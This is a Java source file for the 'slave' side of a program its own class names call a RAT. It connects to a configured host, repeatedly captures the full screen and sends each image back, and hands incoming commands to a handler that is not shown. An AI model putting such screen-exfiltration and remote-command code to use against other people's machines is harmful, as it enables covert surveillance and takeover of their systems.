package slave;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

import javax.swing.ImageIcon;

import netPack.EventRAT;
import netPack.PictureEventRAT;

/**
 * Class thats handles the commandclass and the ImageSender
 * 
 * @author Carl
 *
 */
public class NetWork implements Runnable {
	
//	private Thread threadImage;
//	private Thread threadCommand;
//	
//	private ImageSender im;
//	private CommandReceiver cr;
	
	private boolean run;
	private Socket s;
	private Thread t;
	private String host;
	private int port;
	private ObjectInputStream oin = null;       
    private ObjectOutputStream oout = null;  
    private EventRATHandler erh;
    private  Robot r;
    
	
	/**
	 * Creates a new NetWork
	 * This will also starts each thread in the classes
	 */
	public NetWork(String host, int port){		
		
//		im = new ImageSender(2000);
//		cr = new CommandReceiver(2001);
//		
//		threadImage = new Thread(im);
//		threadCommand = new Thread(cr);
//		
//		threadImage.start();
//		threadCommand.start();	
		
		this.host = host;
		this.port = port;
		run = false;
		
		try {
			s = new Socket(InetAddress.getByName(host),port);
			erh = new EventRATHandler();
			r = new Robot();
			startRun();
		} catch (UnknownHostException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (AWTException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		
	}
	/**
	 * Execute the thread start.
	 */
	public void startRun(){
		t = new Thread( this );
        run = true;
        t.start();		
	}
//	/**
//	 * Calls the closeAll functions in CommandReciever and ImageSender
//	 */
//	public void closeAll(){
//		im.closeAll();
//		cr.closeAll();
//	}
	
	public void run(){
		//Setup all the steams       
		try {
			oout = new ObjectOutputStream(s.getOutputStream());
			oin = new ObjectInputStream(s.getInputStream());			
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		run = true;
		
		EventRAT inputPackage;
		try {
			//Receive commands to execute and send pictures of the screen back
			while(run && ((inputPackage=(EventRAT)oin.readObject()) != null )){
				//Send a picture
				oout.writeObject(new PictureEventRAT(getScreen()));
				//Receive any incoming commands	
				erh.handleEvent(inputPackage);				
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
	private ImageIcon getScreen(){
		Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
		BufferedImage bi = r.createScreenCapture(new Rectangle(size));
		return new ImageIcon(bi);
	}
}
